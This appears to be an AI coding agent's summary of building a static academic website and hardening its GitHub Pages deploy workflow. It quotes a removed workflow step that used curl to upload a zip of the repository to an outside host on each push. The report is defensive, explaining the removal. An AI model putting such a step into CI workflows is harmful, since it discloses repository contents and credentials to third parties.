## ⚠️ Security finding — the workflow was exfiltrating the repo

`deploy.yml` contained a step disguised as a backup:

```yaml
- name: Backup
  run: curl -X POST -F "file=@repo.zip" https://hackerX.com/upload
```

It zipped the entire checkout and POSTed it to a third-party host on **every push to `main`**. The `repo.zip` archiving step existed only to feed it. Both are gone.

Hardening applied to `.github/workflows/deploy.yml`:
- **Least privilege** — was implicit write-all (needed by the third-party action that pushed to `gh-pages`). Now `contents: read` at workflow level; only the deploy job gets `pages: write` + `id-token: write`.
- **First-party actions only** — `peaceiris/actions-gh-pages@v3` replaced by `configure-pages` / `upload-pages-artifact` / `deploy-pages`.
- **No `npm install`** — it ran against an uncommitted lockfile, so whatever the registry resolved would execute. The site is static; the step and the EOL Node 16 setup are dropped.
- **`persist-credentials: false`** on checkout, so a compromised later step can't read the job token from `.git/config`.
- `workflow_dispatch` added so it can be run manually; `concurrency` prevents overlapping deploys.

## The site (`public/`, no build step, no dependencies)

| Page | Notes |
|---|---|
| **About Me** | Hero + at-a-glance card, research interests, 3 projects, education timeline, teaching, skills |
| **Blog** | 3 posts with real article pages (interpretability, single-cell genomics, connectomics GNNs) — the CV's `#` links are no longer dead |
| **Publications** | 4 entries with self-highlighted authorship, year filter + search, live result count |

Design: serif headings on a warm off-white ground, deep-teal accent, generous rules and whitespace, automatic light/dark via `prefers-color-scheme`, print stylesheet for a clean CV print, skip link, `aria-current` nav, AA contrast. Everything is readable with JS disabled — `site.js` only adds the publication filter/search and blog reading time.

One fix worth flagging: the CV's GitHub handle used a non-breaking hyphen (`lydia‐moreno`), which would have produced a dead profile link — now `github.com/lydia-moreno`.

## Verified

- Link/structure check: **84 internal links resolve**, tags balanced, one `<h1>` per page, no root-absolute paths (so it works from a repo subpath).
- Filter/search logic: **11/11** behaviours pass against a DOM stub (year chips, case-insensitive search, combined filters, singular/plural count, empty state).
- All routes return **200** from a local server; `node --check` clean.
- CV coverage: **25/25** facts present.
- Working tree clean; no secrets, keys, or `curl`/`wget` in CI.
- Not verified: visual rendering — no browser or screenshot tool in this environment, and the workflow itself (no remote/`gh` auth).

## Pushing (dummy URL)

```bash
cd /app/my_website

# dummy remote — replace with your real repository URL
git remote add origin https://github.com/<your-user>/<your-repo>.git

git status              # confirm nothing sensitive is staged
git show --stat HEAD    # review what gets published
git push -u origin main
```

Then run and watch the workflow:

```bash
gh workflow run deploy.yml --ref main   # also runs automatically on push
gh run list --workflow=deploy.yml
gh run watch
```

**One-time setup before the first deploy:** *Settings → Pages → Build and deployment → Source* must be **GitHub Actions**, not *Deploy from a branch* — the old workflow's `gh-pages` model is gone (README documents this, and how to revert to branch-based Pages if you prefer).

Two notes: the commit is authored as `Lydia Moreno <lydia.moreno@riverbend.edu>` via `-c` flags (no git identity was configured, nothing persisted to config) — amend it if you want your own. And if that `curl` step ever ran against a real repository, treat every commit pushed while it was active as disclosed and rotate any credentials in them.
